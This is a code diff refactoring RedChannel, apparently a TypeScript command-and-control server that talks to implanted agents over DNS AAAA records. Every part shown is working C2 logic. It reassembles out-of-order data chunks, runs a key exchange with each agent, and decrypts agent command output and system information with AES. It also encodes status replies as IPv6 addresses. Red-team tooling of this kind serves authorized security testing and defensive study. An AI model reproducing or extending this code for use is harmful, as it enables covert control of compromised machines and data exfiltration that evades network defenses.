         const recvqDataId = recvqCommand.get(dataId)!;
 
-        recvqDataId[currentChunk] = chunk;
-        recvqCommand.set(dataId, recvqDataId);
-        // count non undefined data array entries
+        recvqDataId[chunkNumber] = chunk;
+
+        // count all data array entries, excluding undefined
         // since data is not sent in sequence, array may be [undefined, undefined, 123, undefined, 321]
-        if (this.count_data_chunks(recvqDataId) == totalChunks) {
+        if (this.countDataChunks(recvqDataId) == totalChunks) {
             const dataChunks = recvqDataId.join("");
             recvqCommand.delete(dataId);
 
             // process data, send back status (0f = failed, 02 = success)
-            const processStatus = this.process_dns_data(agentId, command, dataChunks);
+            const processStatus = this.processAgentData(agentId, command, dataChunks);
             if (processStatus) {
                 res.answer.push({
                     name: hostname,
                     type: "AAAA",
-                    data: this.make_ip_string(processStatus),
+                    data: this.makeIpString(processStatus),
                     ttl: ttl,
                 });
             }
@@ -978,7 +744,7 @@ class RedChannel {
         }
 
         // last byte 01 indicates more data is expected
-        const moreData = this.make_ip_string("01");
+        const moreData = this.makeIpString("01");
         res.answer.push({
             name: hostname,
             type: "AAAA",
@@ -995,47 +761,53 @@ class RedChannel {
         return res.end();
     }
 
-    process_dns_data(agentId, command, data): AgentStatus {
+    processAgentData(agentId, command, data): AgentStatus {
+        const agent = this.agents.get(agentId);
+        if (!agent) {
+            this.log.error(`agent ${agentId} not found`);
+            return AgentStatus.ERROR_AGENT_UNKNOWN;
+        }
+
         let plaintext = "";
         switch (command) {
             case AgentCommand.AGENT_KEYX:
-                if (!this.agents[agentId].allow_keyx) {
+                if (!agent.allowKeyx) {
                     this.log.error(`incoming keyx from ${agentId} not allowed, initiate keyx first`);
                     break;
                 }
 
                 if (!this.crypto.privateKey) {
                     try {
-                        this.crypto.generate_keys();
+                        this.crypto.generateKeys();
                     } catch (ex) {
                         this.log.error(`failed to generate keys: ${emsg(ex)}`);
                         return AgentStatus.ERROR_GENERATING_KEYS;
                     }
                 }
 
-                const agentPubkey = Buffer.from(data, "hex");
                 try {
-                    this.agents[agentId].keyx = this.crypto.import_uncompressed_pubkey(agentPubkey);
+                    const agentPubkey = Buffer.from(data, "hex");
+                    agent.keyx = this.crypto.importUncompressedPublicKey(agentPubkey);
                 } catch (ex) {
                     this.log.error(`cannot import key for ${agentId}: ${emsg(ex)}`);
                     return AgentStatus.ERROR_IMPORTING_KEY;
                 }
-                this.log.success(`agent(${agentId}) keyx: ${this.agents[agentId].keyx.asPublicECKey().toString("spki")}`);
+                this.log.success(`agent(${agentId}) keyx: ${agent.keyx.asPublicECKey().toString("spki")}`);
 
                 try {
-                    this.agents[agentId].secret = this.crypto.derive_secret(this.agents[agentId].keyx, this.master_password);
+                    agent.secret = this.crypto.deriveSecret(agent.keyx, this.masterPassword);
                 } catch (ex) {
                     this.log.error(`cannot derive secret for ${agentId}: ${emsg(ex)}`);
                     return AgentStatus.ERROR_DERIVING_SECRET;
                 }
-                this.log.success(`agent(${agentId}) secret: ${this.agents[agentId].secret?.toString("hex")}`);
+                this.log.success(`agent(${agentId}) secret: ${agent.secret?.toString("hex")}`);
 
                 // if there are no more queued up keyx's, ignore further keyxs from agent
-                if (!this.is_command_in_sendq(agentId, AgentCommand.AGENT_KEYX)) this.agents[agentId].allow_keyx = false;
+                if (!this.isCommandInSendQ(agentId, AgentCommand.AGENT_KEYX)) agent.allowKeyx = false;
                 break;
             case AgentCommand.AGENT_MSG:
                 try {
-                    plaintext = this.decrypt_dns_message(agentId, data);
+                    plaintext = this.decryptAgentData(agentId, data);
                 } catch (ex) {
                     this.log.error(`cannot decrypt message from ${agentId}: ${emsg(ex)}`);
                     return AgentStatus.ERROR_DECRYPTING_MESSAGE;
@@ -1043,9 +815,8 @@ class RedChannel {
                 this.log.success(`agent(${agentId}) output>\n ${plaintext}`);
                 break;
             case AgentCommand.AGENT_SYSINFO:
-                plaintext = "";
                 try {
-                    plaintext = this.decrypt_dns_message(agentId, data);
+                    plaintext = this.decryptAgentData(agentId, data);
                 } catch (ex) {
                     this.log.error(`cannot decrypt message from ${agentId}: ${emsg(ex)}`);
                     return AgentStatus.ERROR_DECRYPTING_MESSAGE;
@@ -1071,25 +842,34 @@ class RedChannel {
                 ];
 
                 this.log.success(`agent(${agentId}) sysinfo>`);
-                this.log.display_table([], displayRows);
+                this.log.displayTable([], displayRows);
                 break;
         }
         return AgentStatus.DATA_RECEIVED;
     }
 
-    decrypt_dns_message(agentId, data) {
-        if (!agentId) throw new Error("invalid agent id");
-        if (!data) throw new Error("invalid data");
-        if (!this.agents[agentId].keyx) throw new Error("missing keyx");
+    encryptPayload(data: string): string {
+        if (!this.interact) return "";
 
-        const buffer = Buffer.from(data, "hex");
-        const iv = buffer.slice(0, this.crypto.BLOCK_LENGTH);
-        const ciphertext = buffer.slice(this.crypto.BLOCK_LENGTH);
+        const buffer = Buffer.from(data);
+        const cipher = this.crypto.aesEncrypt(buffer, this.interact.secret);
+        const payload = this.makeEncryptedBufferStringHex(cipher);
+        return payload;
+    }
+
+    decryptAgentData(agentId, data) {
+        const agent = this.agents.get(agentId);
+        if (!agent) throw new Error(`agent ${agentId} not found`);
+        if (!data) throw new Error("invalid data");
+        if (!agent.keyx) throw new Error("missing keyx");
+        if (!agent.secret) throw new Error("missing agent secret, do you need to keyx?");
+
+        const dataBuffer = Buffer.from(data, "hex");
+        const iv = dataBuffer.slice(0, this.crypto.BLOCK_LENGTH);
+        const ciphertext = dataBuffer.slice(this.crypto.BLOCK_LENGTH);
 
         // may throw errors
-        const plaintext = this.crypto.aes_decrypt(ciphertext, this.agents[agentId].secret, iv);
+        const plaintext = this.crypto.aesDecrypt(ciphertext, agent.secret, iv);
         return plaintext.toString();
     }
 }
-
-export default RedChannel;
